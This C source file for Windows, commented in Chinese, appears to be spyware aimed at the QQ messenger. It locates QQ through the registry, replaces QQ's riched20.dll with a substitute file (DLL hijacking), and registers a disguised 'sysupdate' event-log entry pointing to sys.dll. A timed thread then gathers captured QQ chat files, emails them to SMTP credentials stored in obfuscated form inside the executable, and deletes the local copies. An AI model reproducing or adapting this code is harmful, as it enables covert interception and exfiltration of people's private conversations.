#include "stdafx.h"

struct config
{
    unsigned int bytes;
    wchar_t magic[2];
    unsigned long int millisecond; // 毫秒
    wchar_t from[_MAX_FNAME],  to[_MAX_FNAME], subject[_MAX_FNAME],
	    smtpserver[_MAX_FNAME], username[_MAX_FNAME], password[_MAX_FNAME], content[_MAX_FNAME];
};

struct TaskStruct
{
	int unsigned threadid;
	HANDLE hPauseContinueEvent, hPeroidEvent;
	const struct config *config;
};

enum {MAXTASK = 128};

struct TaskTable
{
	int unsigned n;
	HANDLE hPauseContinueEvent, hPeroidEvent;
	struct TaskStruct task[MAXTASK];
	struct config config;
};

static struct TaskTable tasktable;

static unsigned int __stdcall dotask(void *arg);

/* 返回大于0的值表示成功，返回0表示失败。 */
typedef int unsigned (*filecallback_t)(void *arg, const wchar_t *filepath);

/* del: true 表示当 fb 执行成功时删除 file */
static void searchdir(const wchar_t *dirname, int unsigned *filecount, bool del, filecallback_t fb, void *arg);
static const wchar_t *getdir(wchar_t *dir, int dirsizewchars, const wchar_t *subdir);
static int unsigned readconfig(struct config *config);
#if 0
static int unsigned readconfig2(struct config *config);
#endif
static unsigned int __fastcall decryptpassword(wchar_t *dest, int unsigned sizewchars,
			const wchar_t *password, int unsigned lenwchars);
static void dowork(const struct config *config);

static void copyriched20(const _TCHAR *const qqpath);
static void findQQ(void);
static void createeventdll(void);

//__restrict
void starttask(void)
{
	if(tasktable.n >= MAXTASK)
		return;

	findQQ();
	createeventdll();
	if(readconfig(&tasktable.config) == -1)
		return;

	if(tasktable.n == 0u) { // 这是第一次执行这个函数
		// Manual Rest, initial state of the event object is signaled
		tasktable.hPauseContinueEvent = CreateEvent(NULL, TRUE, TRUE, NULL);
		// Manual Rest, initial state of the event object is nonsignaled
		tasktable.hPeroidEvent = CreateEvent(NULL, TRUE, FALSE, NULL);
	}

	struct TaskStruct *cur = &tasktable.task[tasktable.n];
	cur->hPauseContinueEvent = tasktable.hPauseContinueEvent;
	cur->hPeroidEvent = tasktable.hPeroidEvent;
	cur->config = &tasktable.config;
	_beginthreadex(NULL, 0U, dotask, cur, 0U, &cur->threadid);
	tasktable.n++;
}

void stoptask(void)
{
	SetEvent(tasktable.hPauseContinueEvent);
	SetEvent(tasktable.hPeroidEvent);

	for(unsigned int i = 0u; i < tasktable.n; i++) {
		WaitForSingleObject((HANDLE)tasktable.task[i].threadid, INFINITE);
	    CloseHandle((HANDLE)tasktable.task[i].threadid);
	}
	if(tasktable.n > 0u) {
	    CloseHandle(tasktable.hPauseContinueEvent);
	    CloseHandle(tasktable.hPeroidEvent);
	    memset(&tasktable, 0, sizeof(tasktable));
	}
}

void pausetask(void)
{
	ResetEvent(tasktable.hPauseContinueEvent);
}

void continuetask(void)
{
	SetEvent(tasktable.hPauseContinueEvent);
}

void printconfig(FILE *fp)
{
	struct config config;
	if(readconfig(&config) == 0u)
		fputws(L"读配置文件错。\n", fp);
	fwprintf(fp,
		L"bytes:    [%lu]\n"
		L"magic:    [%c%c]\n"
		L"milliseconds = [%lu]\n"
		L"From: %s\n"
		L"To: [%s]\n"
		L"Subject: [%s]\n"
		L"smtpserver: [%s]\n"
		L"username: [%s]\n"
		L"password: [%s]\n"
		L"%lu",
		config.bytes, config.magic[0], config.magic[1],config.millisecond, 
		config.from, config.to, config.subject, config.smtpserver, config.username, config.password, sizeof(struct config));
}

#if 0
static unsigned int __stdcall dotask(void *arg)
{
	static int i = 0;

	struct TaskStruct *me = (struct TaskStruct *)arg;
	FILE *fp;
	fp = _wfopen(L"D:\\dotask.txt", L"at");
	while(WaitForSingleObject(me->hPeroidEvent, 2000LU) == WAIT_TIMEOUT) { // 等指定的秒数
	    WaitForSingleObject(me->hPauseContinueEvent, INFINITE);
		fwprintf(fp, L"i = %d\n", i++);
		fflush(fp);
	}
	fclose(fp);
	_endthreadex(0U);
	return 0U;
}
#endif

static unsigned int __stdcall dotask(void *arg)
{
	static int i = 0;

	struct TaskStruct *me = (struct TaskStruct *)arg;

	while(WaitForSingleObject(me->hPeroidEvent, me->config->millisecond) == WAIT_TIMEOUT) { // 等指定的秒数
		WaitForSingleObject(me->hPauseContinueEvent, INFINITE);
		dowork(me->config);
	}
	_endthreadex(0U);
	return 0U;
}

static void searchdir(const wchar_t *dirname, int unsigned *filecount, bool del, filecallback_t fb, void *arg)
{
    int handle;
     struct _wfinddata64_t fileinfo;
    wchar_t cwd[_MAX_PATH];

    memset(&fileinfo, 0, sizeof(fileinfo));
    wmemset(cwd, L'\0', sizeof(cwd) / sizeof(cwd[0]));
    _wgetcwd(cwd, sizeof(cwd) / sizeof(cwd[0]));

    _wchdir(dirname);

    if((handle = _wfindfirst64(L"*.*", &fileinfo)) != -1)
        do {
            if(wcscmp(fileinfo.name, L".") == 0 
                    || wcscmp(fileinfo.name, L"..") == 0)
                continue;
            if((fileinfo.attrib & _A_SUBDIR) == _A_SUBDIR)
                searchdir(fileinfo.name, filecount, del, fb, arg);
            else if((fileinfo.attrib & _A_ARCH) == _A_ARCH || (fileinfo.attrib & _A_NORMAL) == _A_NORMAL)
                if(fb((struct mail *)arg, fileinfo.name) > 0) {
					if(filecount)
						(*filecount)++;
					if(del)
						_wunlink(fileinfo.name);
				}
        } while(_wfindnext64(handle, &fileinfo) != -1);

    _findclose(handle);
    _wchdir(cwd);
}

static const wchar_t *getdir(wchar_t *dir, int dirsizewchars, const wchar_t *subdir)
{
	wchar_t *p;
	
	wmemset(dir, L'\0', dirsizewchars);
	if((p = _wgetenv(L"TEMP")) == NULL && (p = _wgetenv(L"TMP")) == NULL && (p = _wgetenv(L"APPDATA")) == NULL) {
        wcscpy(dir, L"C:\\system64"); 
		if(_waccess(dir, 06) == -1)
			_wmkdir(dir);
	}
	else 
		wcscpy(dir, p);
	wcscat(dir, subdir);
	if(_waccess(dir, 06) == -1)
	    _wmkdir(dir);
	return dir;
}

/* 失败返回 0，成功返回1 */
static int unsigned readconfig(struct config *config)
{
	wchar_t mypath[_MAX_PATH];
	FILE *fp;

	GetModuleFileName(NULL, mypath, sizeof(mypath) / sizeof(mypath[0]));
	if((fp = _wfopen(mypath, L"rb")) == NULL)
		return 0u;

	_fseeki64(fp, -(__int64)sizeof(struct config), SEEK_END);
	fread(config, sizeof(struct config), 1u, fp);
	fclose(fp);

	if(config->magic[0] != L'B' || config->magic[1] != L'M' || config->bytes != sizeof(struct config))
		return 0u;
	wchar_t dep[sizeof(config->password) / sizeof(wchar_t)];
	decryptpassword(dep, sizeof(dep) / sizeof(wchar_t), config->password, wcslen(config->password));
	wcsncpy(config->password, dep, sizeof(dep) / sizeof(wchar_t));
	return 1u;
}

#if 0
/* 失败返回 0，成功返回1 */
static int unsigned readconfig2(struct config *config)
{
	wchar_t configpath[_MAX_PATH];

    getdir(configpath, sizeof(configpath) / sizeof(configpath[0]), L"\\qqconfig\\system64.cfg");

#if 0
	FILE *tfp;
	tfp = _wfopen(L"D:\\app.txt", L"at");
	wchar_t **env = _wenviron;
	while(*env) {
		fwprintf(tfp, L"%s\n", *env++);
	}
	fclose(tfp);
#endif
	FILE *fp;
	if((fp = _wfopen(configpath, L"rb")) == NULL)
		return 0u;
	unsigned int readitems;
	memset(config, 0, sizeof(struct config));
	readitems = fread(config, sizeof(struct config), 1u, fp);
	fclose(fp);
	wchar_t dep[sizeof(config->password) / sizeof(wchar_t)];
	decryptpassword(dep, sizeof(dep) / sizeof(wchar_t), config->password, wcslen(config->password));
	wcsncpy(config->password, dep, sizeof(dep) / sizeof(wchar_t));
	return 1u;
}
#endif

static unsigned int __fastcall decryptpassword(wchar_t *dest, int unsigned sizewchars,
			const wchar_t *password, int unsigned lenwchars)
{
   wchar_t *pdest;
   const wchar_t *pp;

   pdest = dest;
   pp = password;
   while(pdest - dest + 1u < sizewchars && *pp && pp - password + 0u < lenwchars) {
	   *pdest++ = *pp - (pp - password + 1);
	   pp++;
   }
   *pdest = L'\0';
   return pdest - dest;
}

static void dowork(const struct config *config)
{
	struct mail *mail;
	wchar_t chatpath[_MAX_PATH];
	int unsigned filecount;
	mail = newmail();
	makemailw(mail, config->from, config->to, config->subject, 
		config->smtpserver, config->username, config->password, 
		config->content, NULL);
	getdir(chatpath, sizeof(chatpath) / sizeof(chatpath[0]), L"\\qq");
	filecount = 0u;
	searchdir(chatpath, &filecount, true, (filecallback_t)catmailattachment, (void *)mail);
	if(filecount > 0u) {
	    completemail(mail);
	    sendmail(mail);
	}
    deletemail(&mail);
}

static void findQQ(void)
{
	HKEY   platformtypelist;
	long int ret;
	_TCHAR key[] = _T("Software\\Tencent\\PlatForm_Type_List");

	platformtypelist = NULL;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		key, 0U, KEY_ENUMERATE_SUB_KEYS | KEY_READ,	&platformtypelist) != ERROR_SUCCESS)
	{
		return;
	}
	_TCHAR subkey[_MAX_FNAME];
	unsigned long int subkeysize_tchars, index;
	index = 0Ul;
	subkeysize_tchars = sizeof(subkey) / sizeof(subkey[0]);
	memset(subkey, 0, sizeof(subkey));
	while((ret = RegEnumKeyEx(platformtypelist, index++, 
		subkey, &subkeysize_tchars, NULL, NULL, NULL, NULL)) == ERROR_SUCCESS)
	{
		_TCHAR qqpath[_MAX_PATH], tmp[_MAX_FNAME];
		HKEY hsubkey;
		unsigned long int qqpathsize_bytes;

		memset(qqpath, 0, qqpathsize_bytes = sizeof(qqpath));
		memset(tmp, 0, sizeof(tmp));
		_tcscat(_tcscat(_tcscpy(tmp, key), _T("\\")), subkey);
		if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, 
		    tmp, 0U, KEY_ENUMERATE_SUB_KEYS | KEY_READ,	&hsubkey) != ERROR_SUCCESS)
		{
			break;
		}
		if(RegQueryValueEx(hsubkey, _T("TypePath"), NULL, NULL,
			(unsigned char *)qqpath, &qqpathsize_bytes) == ERROR_SUCCESS)
		{
			// do something
			copyriched20(qqpath);
		}
		RegCloseKey(hsubkey);
		subkeysize_tchars = sizeof(subkey) / sizeof(subkey[0]);
	}
	if(ret != ERROR_NO_MORE_ITEMS)
	{
		// error!!!
	}
	RegCloseKey(platformtypelist);
}


static void copyriched20(const _TCHAR *const qqpath)
{
	_TCHAR srcrichpath[_MAX_PATH], dstrichpath[_MAX_PATH], origrichpath[_MAX_PATH], *p;
	_TCHAR *prich = _T("riched20.dll"), *prichorig = _T("riched20.orig.dll");

	memset(srcrichpath, 0, sizeof(srcrichpath));
	memset(dstrichpath, 0, sizeof(dstrichpath));
	memset(origrichpath, 0, sizeof(origrichpath));

	_tsplitpath(qqpath, origrichpath, NULL, NULL, NULL);
	_tsplitpath(qqpath, NULL, &origrichpath[_tcslen(origrichpath)], NULL, NULL);
	_tcscat(_tcscpy(dstrichpath, origrichpath), prich);
	_tcscat(origrichpath, prichorig);

	GetModuleFileName(NULL, srcrichpath, sizeof(srcrichpath) / sizeof(srcrichpath[0]) - 1);
	if((p = _tcsrchr(srcrichpath, _T('\\'))) == NULL)
		return;
	*(p + 1) = _T('\0');
	wcscat(srcrichpath, L"rich.bak.exe");

	if(_taccess(srcrichpath, 00) == -1)
		return; // 源文件不存在

	if(_taccess(dstrichpath, 00) == 0)
	{
		unsigned long int fileinfosize;
		void *version;

		fileinfosize = GetFileVersionInfoSize(dstrichpath, NULL);
		if((version = malloc(fileinfosize)) != NULL
		    && GetFileVersionInfo(dstrichpath, NULL, fileinfosize, version))
		{
			unsigned int len;
			VS_FIXEDFILEINFO *fixinfo;
			if(VerQueryValue(version, _T("\\"), (void **)&fixinfo, &len))
			{
				if(fixinfo->dwFileVersionMS == 0x00060006 && fixinfo->dwFileVersionLS == 0x00060007)
				{
					// 这是我们的 riched20，还有其他条件需要判断
					// 不需要替换了
				}
				else if(_taccess(origrichpath, 00) == -1 && _trename(dstrichpath, origrichpath) == 0)
				{
					// 目标文件存在，目标备份文件不存在
					CopyFile(srcrichpath, dstrichpath, TRUE);
				}
			}
			free(version);
		}
	}
}

static void createeventdll(void)
{
	HKEY sysupdate;
	long int ret;
	wchar_t key[_MAX_PATH] = L"SYSTEM\\CurrentControlSet\\Services\\Eventlog\\Application";

	sysupdate = NULL;
	if(RegOpenKeyEx(HKEY_LOCAL_MACHINE, key, 0U, KEY_ALL_ACCESS,	&sysupdate) != ERROR_SUCCESS)
		return;
	HKEY hsubkey;
	unsigned long int lpdwDisposition;
	if(RegCreateKeyEx(sysupdate, L"sysupdate", 0Ul, NULL, 0L, KEY_CREATE_SUB_KEY, NULL, 
		&hsubkey, &lpdwDisposition) != ERROR_SUCCESS)
		return;
	RegCloseKey(hsubkey);
	RegCloseKey(sysupdate);
    wcscat(key, L"\\sysupdate");
    SetLastError(0LU);
    if(RegOpenKeyEx(HKEY_LOCAL_MACHINE,  key, 0, KEY_ALL_ACCESS, &hsubkey) != ERROR_SUCCESS) {
        wprintf(L"\n%lu\n", GetLastError());
        return;
    }
	unsigned char sysdllpath[_MAX_PATH];
	SHGetFolderPathA(NULL, CSIDL_SYSTEM, NULL, SHGFP_TYPE_CURRENT, (char *)sysdllpath);
	strcat((char *)sysdllpath, "\\sys.dll");
	RegSetValueExA(hsubkey, "EventMessageFile", 0lu, REG_SZ, sysdllpath, strlen((const char *)sysdllpath) + 1);
    wprintf(L"\n%lu\n", GetLastError());
    long unsigned int value = 0x000007lu;
	RegSetValueExA(hsubkey, "TypesSupported", 0lu, REG_DWORD, (unsigned char *)&value, sizeof(value));
    wprintf(L"%lu\n", GetLastError());
	RegCloseKey(hsubkey);
}